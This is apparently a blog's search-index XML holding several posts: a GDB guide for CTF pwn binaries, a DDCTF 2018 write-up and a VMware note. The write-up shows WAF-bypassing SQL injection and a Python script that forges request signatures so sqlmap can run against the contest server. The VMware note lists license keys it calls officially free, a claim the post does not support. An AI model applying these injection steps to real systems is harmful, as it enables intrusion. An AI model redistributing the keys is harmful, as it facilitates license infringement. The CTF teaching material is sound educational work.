<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[虚拟机相关]]></title>
      <url>https://ex1t.cn/2020/06/25/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E5%85%B3/</url>
      <content type="html"><![CDATA[<p>VMware要付费，VirtualBox免费。试了下觉得VMware要好用一点，而且有真香激活码可以用，为什么叫真香激活码呢，就是和微软放任盗版一样，为了占据市场份额，VMware放出来给个人用户免费使用的激活码。当然的，这个激活码不允许商业使用，不然会被送律师函。真香激活码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VMware Workstation Pro 12 激活密钥</span><br><span class="line"></span><br><span class="line">5A02H-AU243-TZJ49-GTC7K-3C61N</span><br><span class="line">VF5XA-FNDDJ-085GZ-4NXZ9-N20E6</span><br><span class="line">UC5MR-8NE16-H81WY-R7QGV-QG2D8</span><br><span class="line">ZG1WH-ATY96-H80QP-X7PEX-Y30V4</span><br><span class="line">AA3E0-0VDE1-0893Z-KGZ59-QGAVF</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VMware Workstation Pro 14 激活密钥</span><br><span class="line"></span><br><span class="line">CG54H-D8D0H-H8DHY-C6X7X-N2KG6</span><br><span class="line">ZC3WK-AFXEK-488JP-A7MQX-XL8YF</span><br><span class="line">AC5XK-0ZD4H-088HP-9NQZV-ZG2R4</span><br><span class="line">ZC5XK-A6E0M-080XQ-04ZZG-YF08D</span><br><span class="line">ZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8</span><br><span class="line">FF31K-AHZD1-H8ETZ-8WWEZ-WUUVA</span><br><span class="line">CV7T2-6WY5Q-48EWP-ZXY7X-QGUWD</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">VMware Workstation Pro 15 激活密钥</span><br><span class="line"></span><br><span class="line">UG5J2-0ME12-M89WY-NPWXX-WQH88</span><br><span class="line">GA590-86Y05-4806Y-X4PEE-ZV8E0</span><br><span class="line">YA18K-0WY8P-H85DY-L4NZG-X7RAD</span><br><span class="line">UA5DR-2ZD4H-089FY-6YQ5T-YPRX6</span><br><span class="line">B806Y-86Y05-GA590-X4PEE-ZV8E0</span><br><span class="line">ZF582-0NW5N-H8D2P-0XZEE-Z22VA</span><br></pre></td></tr></table></figure>
<p>官网安装包：    </p>
<p><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-12.5.9-7535481.exe" target="_blank" rel="noopener">VMware Workstation Pro 12.5.9 Build 7535481 </a><br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-14.1.3-9474260.exe" target="_blank" rel="noopener">VMware Workstation Pro 14.1.3 Build 9474260</a><br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.6-16341506.exe" target="_blank" rel="noopener">VMware Workstation Pro 15.5.6 Build 16341506</a> Update 2019/11/1: 最新版本win10只支持v15.5    </p>
<hr>
<p>使用虚拟机过程中总是会遇到vmtools不好使的情况，可以试试<br><code>apt install open-vm-tools open-vm-tools-desktop</code><br>然后运行<br><code>vmware-user</code></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux的杂七杂八]]></title>
      <url>https://ex1t.cn/2018/11/29/Linux%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/</url>
      <content type="html"><![CDATA[<p>从高二开始接触Linux，到现在差不多有4年了，感觉之前学的东西忘了好多，所以心血来潮想把关于Linux的东西开一篇博客记下来。<br>目前还是用虚拟机玩Linux，以前试过双系统，但是快速启动用不了而且要安Grub很烦人就换回来了。<br>(不用Windows是不可能的，育碧、EA、G胖、暴雪还等着我交钱呢)  </p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[GDB在CTF解题中的一些使用技巧]]></title>
      <url>https://ex1t.cn/2018/11/26/GDB%E5%9C%A8CTF%E8%A7%A3%E9%A2%98%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>当我拿到一道PWN题时，应该如何用GDB处理这个二进制程序。<br>我搭建了一个最轻量版的64位Ubuntu16的虚拟机(无图形界面)用来调试PWN的二进制程序<br>安装了GDB以及GDB的Peda插件，并且安装了32位的兼容  </p>
<h1 id="找到main函数"><a href="#找到main函数" class="headerlink" title="找到main函数"></a>找到main函数</h1><p>CTF的PWN题一般是经过了strip的，没有符号表，也不知道函数名<br>(但是不知道为什么IDA Pro就能识别出main函数，很奇怪，这个坑留到后面补)<br>所以想要调试题目，最先要做的事情就是找到程序的入口函数: main  </p>
<p>最快的方式是直接使用 <code>r</code>(run)指令，跑一下这个程序，程序会在输入点循环等待输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntuM<span class="keyword">in</span>:~$ gdb sendflag</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/ubuntu/sendflag</span><br><span class="line">WELCOME TO PWN</span><br><span class="line">I WILL SEND YOU FLAG</span><br><span class="line">BUT YOU SHOULD SEND ME SOME <span class="string">'a'</span></span><br></pre></td></tr></table></figure></p>
<p> 这个时候按下<code>Ctrl+C</code>手动中断这个程序，程序会中断在输入函数里面<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/ubuntu/sendflag</span><br><span class="line">WELCOME TO PWN</span><br><span class="line">I WILL SEND YOU FLAG</span><br><span class="line">BUT YOU SHOULD SEND ME SOME <span class="string">'a'</span></span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: <span class="number">0xfffffe00</span></span><br><span class="line">EBX: <span class="number">0x0</span></span><br><span class="line">ECX: 0x804b410 --&gt; 0x0</span><br><span class="line">EDX: <span class="number">0x400</span></span><br><span class="line">ESI: 0xf7fc85a0 --&gt; 0xfbad2288</span><br><span class="line">EDI: 0xf7fc8d60 --&gt; 0xfbad2a84</span><br><span class="line">EBP: 0xffffcf68 --&gt; 0xffffd5b8 --&gt; 0xffffd5f8 --&gt; 0xffffd628 --&gt; 0x0</span><br><span class="line">ESP: 0xffffcf18 --&gt; 0xffffcf68 --&gt; 0xffffd5b8 --&gt; 0xffffd5f8 --&gt; 0xffffd628 --&gt; 0x0</span><br><span class="line">EIP: <span class="number">0xf7fd9be9</span> (&lt;__kernel_vsyscall+<span class="number">9</span>&gt;: pop    ebp)</span><br><span class="line">EFLAGS: <span class="number">0x206</span> (carry PARITY adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0xf7fd9be3</span> &lt;__kernel_vsyscall+<span class="number">3</span>&gt;:    mov    ebp,esp</span><br><span class="line">   <span class="number">0xf7fd9be5</span> &lt;__kernel_vsyscall+<span class="number">5</span>&gt;:    sysenter</span><br><span class="line">   <span class="number">0xf7fd9be7</span> &lt;__kernel_vsyscall+<span class="number">7</span>&gt;:    int    <span class="number">0x80</span></span><br><span class="line">=&gt; 0xf7fd9be9 &lt;__kernel_vsyscall+9&gt;:    pop    ebp</span><br><span class="line">   <span class="number">0xf7fd9bea</span> &lt;__kernel_vsyscall+<span class="number">10</span>&gt;:   pop    edx</span><br><span class="line">   <span class="number">0xf7fd9beb</span> &lt;__kernel_vsyscall+<span class="number">11</span>&gt;:   pop    ecx</span><br><span class="line">   <span class="number">0xf7fd9bec</span> &lt;__kernel_vsyscall+<span class="number">12</span>&gt;:   ret</span><br><span class="line">   <span class="number">0xf7fd9bed</span>:  adc    bh,bl</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffcf18 --&gt; 0xffffcf68 --&gt; 0xffffd5b8 --&gt; 0xffffd5f8 --&gt; 0xffffd628 --&gt; 0x0</span><br><span class="line">0004| 0xffffcf1c --&gt; 0x400</span><br><span class="line">0008| 0xffffcf20 --&gt; 0x804b410 --&gt; 0x0</span><br><span class="line">0012| 0xffffcf24 --&gt; 0xf7eec373 (&lt;read+35&gt;:     pop    ebx)</span><br><span class="line">0016| 0xffffcf28 --&gt; 0xf7fc8000 --&gt; 0x1afdb0</span><br><span class="line">0020| 0xffffcf2c --&gt; 0xf7e81627 (&lt;_IO_file_underflow+295&gt;:      add    esp,0x10)</span><br><span class="line">0024| 0xffffcf30 --&gt; 0x0</span><br><span class="line">0028| 0xffffcf34 --&gt; 0x804b410 --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGINT</span><br><span class="line"><span class="number">0xf7fd9be9</span> <span class="keyword">in</span> __kernel_vsyscall ()</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p>
<p>程序中断之后，使用 <code>bt</code> (backtrack) 来回溯函数调用，打印每一级的返回地址，<br>从而可以确定call调用指令的地址(一般返回地址是call指令地址+1的位置)<br>我们可以找到一个叫做__libc_start_main ()的lib函数，这个函数的第一个参数就是main函数的地址，是用来调用main函数的。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __libc_start_main(<span class="keyword">int</span> (__cdecl *main)(<span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">char</span> **), <span class="keyword">int</span> argc, <span class="keyword">char</span> **ubp_av, <span class="keyword">void</span> (*init)(<span class="keyword">void</span>), <span class="keyword">void</span> (*fini)(<span class="keyword">void</span>), <span class="keyword">void</span> (*rtld_fini)(<span class="keyword">void</span>), <span class="keyword">void</span> *stack_end);</span><br></pre></td></tr></table></figure></p>
<p>可以看到__libc_start_main ()的返回地址在第九级： <code>0x080483b1</code>，因为没有符号表所以显示<code>in ?? ()</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bt</span><br><span class="line">#0  0xf7fd9be9 in __kernel_vsyscall ()</span><br><span class="line">#1  0xf7eec373 in read () from /lib32/libc.so.6</span><br><span class="line">#2  0xf7e81627 in _IO_file_underflow () from /lib32/libc.so.6</span><br><span class="line">#3  0xf7e825e7 in _IO_default_uflow () from /lib32/libc.so.6</span><br><span class="line">#4  0xf7e823dc in __uflow () from /lib32/libc.so.6</span><br><span class="line">#5  0xf7e67429 in _IO_vfscanf () from /lib32/libc.so.6</span><br><span class="line">#6  0xf7e7362e in __isoc99_scanf () from /lib32/libc.so.6</span><br><span class="line">#7  0x080484dd in ?? ()</span><br><span class="line">#8  0xf7e30637 in __libc_start_main () from /lib32/libc.so.6</span><br><span class="line">#9  0x080483b1 in ?? ()</span><br></pre></td></tr></table></figure></p>
<p>我们去看一下这个地址<code>0x080483b1</code>之前的汇编代码，GDB中<code>disas</code>(disasemble)命令用来将二进制反汇编出汇编代码<br>这里我们用<code>disas start,+length</code>的格式反汇编一段地址空间的数据<br>可以看到在call之前push了一个地址，根据32位linux的传参规则，最后一个push的是第一个参数，那么<br><code>0x804848b</code>就可以确定是main的地址了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas <span class="number">0x080483b1</span><span class="number">-20</span>,+<span class="number">20</span></span><br><span class="line">Dump of assembler code <span class="keyword">from</span> <span class="number">0x804839d</span> to <span class="number">0x80483b1</span>:</span><br><span class="line">   <span class="number">0x0804839d</span>:  test   DWORD PTR [eax+ecx*<span class="number">1</span>],eax</span><br><span class="line">   <span class="number">0x080483a0</span>:  push   <span class="number">0x8048540</span></span><br><span class="line">   <span class="number">0x080483a5</span>:  push   ecx</span><br><span class="line">   <span class="number">0x080483a6</span>:  push   esi</span><br><span class="line">   <span class="number">0x080483a7</span>:  push   <span class="number">0x804848b</span></span><br><span class="line">   <span class="number">0x080483ac</span>:  call   <span class="number">0x8048360</span> &lt;__libc_start_main@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>现在去看一下main,发现了几个PUT函数和scanf函数，找到了程序的核心代码，这个题目是个非常简单的溢出题<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">disas <span class="number">0x804848b</span>,+<span class="number">100</span></span><br><span class="line">Dump of assembler code <span class="keyword">from</span> <span class="number">0x804848b</span> to <span class="number">0x80484ef</span>:</span><br><span class="line">   <span class="number">0x0804848b</span>:  lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x0804848f</span>:  <span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x08048492</span>:  push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x08048495</span>:  push   ebp</span><br><span class="line">   <span class="number">0x08048496</span>:  mov    ebp,esp</span><br><span class="line">   <span class="number">0x08048498</span>:  push   ecx</span><br><span class="line">   <span class="number">0x08048499</span>:  sub    esp,<span class="number">0x14</span></span><br><span class="line">   <span class="number">0x0804849c</span>:  sub    esp,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x0804849f</span>:  push   <span class="number">0x80485c0</span></span><br><span class="line">   <span class="number">0x080484a4</span>:  call   <span class="number">0x8048340</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x080484a9</span>:  add    esp,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x080484ac</span>:  sub    esp,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x080484af</span>:  push   <span class="number">0x80485cf</span></span><br><span class="line">   <span class="number">0x080484b4</span>:  call   <span class="number">0x8048340</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x080484b9</span>:  add    esp,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x080484bc</span>:  sub    esp,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x080484bf</span>:  push   <span class="number">0x80485e4</span></span><br><span class="line">   <span class="number">0x080484c4</span>:  call   <span class="number">0x8048340</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x080484c9</span>:  add    esp,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x080484cc</span>:  sub    esp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x080484cf</span>:  lea    eax,[ebp<span class="number">-0x10</span>]</span><br><span class="line">   <span class="number">0x080484d2</span>:  push   eax</span><br><span class="line">   <span class="number">0x080484d3</span>:  push   <span class="number">0x8048604</span></span><br><span class="line">   <span class="number">0x080484d8</span>:  call   <span class="number">0x8048370</span> &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   <span class="number">0x080484dd</span>:  add    esp,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x080484e0</span>:  cmp    DWORD PTR [ebp<span class="number">-0xc</span>],<span class="number">0x61616161</span></span><br><span class="line">   <span class="number">0x080484e7</span>:  jne    <span class="number">0x804850b</span></span><br><span class="line">   <span class="number">0x080484e9</span>:  sub    esp,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x080484ec</span>:  push   <span class="number">0x8048608</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[折腾Docker记下来的东西]]></title>
      <url>https://ex1t.cn/2018/11/25/%E6%8A%98%E8%85%BEDocker%E8%AE%B0%E4%B8%8B%E6%9D%A5%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[DDCTF2018_WriteUp]]></title>
      <url>https://ex1t.cn/2018/04/30/DDCTF2018-WriteUp/</url>
      <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web1-数据库的秘密"><a href="#Web1-数据库的秘密" class="headerlink" title="Web1 数据库的秘密"></a>Web1 数据库的秘密</h2><p>这个题目是一个绕过WAF注入的题目，顺带考了一些Web的基础知识，第一次手动做WAF绕过，Mark一下<br>题目：<a href="http://116.85.43.88:8080/UNWROBCEZRCYCMKH/dfe3ia/index.php" target="_blank" rel="noopener">http://116.85.43.88:8080/UNWROBCEZRCYCMKH/dfe3ia/index.php</a><br>打开提示 <code>非法链接，只允许来自 123.232.23.245 的访问</code><br>加个header：<code>x-forwarded-for:123.232.23.245</code><br>成功访问，页面为一个搜索框和数据框，看看源码发现有一个hidden的input表单项,参数为author，猜测其为注入点，进行SQL注入<br>然后发现了WAF，一开始看到WAF是安全狗，一直去找过狗的方法，结果只是表面是安全狗，实际上规则是出题人定义的,<code>/*!union select*/</code>这种一点用都没有。。。<br>一开始用hackbar来注入，直接改author然后post提示sig错误，发现还要验证sig，看了一下js，发现一个main.js和math.js，math.js是个算sha-1的js，还有一行<br><code>var key=&quot;\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165&quot;;</code><br>打开main.js看到了很奇怪的代码:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'e f(0,4)&#123;5 7=\'\';l(i m 0)&#123;n(i!=\'c\')&#123;a=\'\';a=i+\'=\'+0[i];7+=a&#125;&#125;o k(7+4)&#125;;5 0=&#123;8:\'\',9:\'\',b:\'\',6:\'\',d:h(j v().u()/w)&#125;;e x()&#123;0[\'8\']=1.2(\'8\').3;0[\'9\']=1.2(\'9\').3;0[\'b\']=1.2(\'b\').3;0[\'6\']=1.2(\'6\').3;5 c=f(0,4);1.2(\'g\').q="p.s?r="+c+"&amp;d="+0.d;1.2(\'g\').t()&#125;'</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="string">'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure></p>
<p>一开始还懵了，觉得是不是找错了，后来想起来以前做过这种js很奇怪的题目，可能是用eval加了混淆，直接用Web Developer里面的Javascript Deobfuscator插件还原正常的js<br>打开Javascript Deobfuscator后重新访问一次页面，它会记录所有编译过的js，找到main.js最后一次编译的地方，看到已经是正常的js了，copy到sublime text里面自动排版一下，得到下面的代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">signGenerate</span>(<span class="params">obj, key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str0 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> obj)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != <span class="string">'sign'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            str1 = <span class="string">''</span>;</span><br><span class="line">            str1 = i + <span class="string">'='</span> + obj[i];</span><br><span class="line">            str0 += str1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hex_math_enc(str0 + key)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> obj =</span><br><span class="line">&#123;</span><br><span class="line">    id : <span class="string">''</span>,</span><br><span class="line">    title : <span class="string">''</span>,</span><br><span class="line">    author : <span class="string">''</span>,</span><br><span class="line">    date : <span class="string">''</span>,</span><br><span class="line">    time : <span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitt</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj[<span class="string">'id'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'id'</span>).value;</span><br><span class="line">    obj[<span class="string">'title'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).value;</span><br><span class="line">    obj[<span class="string">'author'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'author'</span>).value;</span><br><span class="line">    obj[<span class="string">'date'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'date'</span>).value;</span><br><span class="line">    <span class="keyword">var</span> sign = signGenerate(obj, key);</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'queryForm'</span>).action = <span class="string">"index.php?sig="</span> + sign + <span class="string">"&amp;time="</span> + obj.time;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'queryForm'</span>).submit()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>sig就是所有参数连起来的一个字符串用key算出来的sha-1，解决了sig，继续手注<br>后面花点时间fuzz一下发现 select 不会被拦截，union 和 select 一起用才会被拦截，于是想到 Boolean 注入<br>但是 =, &lt;, &gt; 都被拦截了,最后发现like和between没有过滤，可以利用like和between进行Boolean注入<br>然后比较懒，不想自己写脚本跑Boolean注入，就用python写了个中转网页用来跑sqlmap<br>web1.py:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamperInteract</span><span class="params">(param)</span>:</span></span><br><span class="line"></span><br><span class="line">    key = <span class="string">"\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165"</span></span><br><span class="line"></span><br><span class="line">    obj = dict()</span><br><span class="line">    obj[<span class="string">'id'</span>] = <span class="string">""</span></span><br><span class="line">    obj[<span class="string">'title'</span>] = <span class="string">""</span></span><br><span class="line">    obj[<span class="string">'author'</span>] = param</span><br><span class="line">    obj[<span class="string">'date'</span>] = <span class="string">""</span></span><br><span class="line">    obj[<span class="string">'time'</span>] = str(int(time.time()))</span><br><span class="line">    headers = &#123;<span class="string">'x-forwarded-for'</span>: <span class="string">'123.232.23.245'</span>&#125;</span><br><span class="line"></span><br><span class="line">    urlParam = <span class="string">'id='</span> + obj[<span class="string">'id'</span>] + <span class="string">'title='</span> + obj[<span class="string">'title'</span>] + <span class="string">'author='</span> + \</span><br><span class="line">        obj[<span class="string">'author'</span>] + <span class="string">'date='</span> + obj[<span class="string">'date'</span>] + <span class="string">'time='</span> + obj[<span class="string">'time'</span>] + key</span><br><span class="line">    urlParam = hashlib.sha1(urlParam.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    url = <span class="string">"http://116.85.43.88:8080/UNWROBCEZRCYCMKH/dfe3ia/index.php?sig="</span> + \</span><br><span class="line">        urlParam + <span class="string">"&amp;time="</span> + obj[<span class="string">'time'</span>]</span><br><span class="line">    <span class="comment">#print(url)</span></span><br><span class="line">    data = &#123;<span class="string">'id'</span>: obj[<span class="string">'id'</span>], <span class="string">'title'</span>: obj[<span class="string">'title'</span>],</span><br><span class="line">            <span class="string">'author'</span>: obj[<span class="string">'author'</span>], <span class="string">'date'</span>: obj[<span class="string">'date'</span>]&#125;</span><br><span class="line">    <span class="comment">#print(data)</span></span><br><span class="line">    res = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        p = input()</span></span><br><span class="line"><span class="string">        print(tamperInteract(p))</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
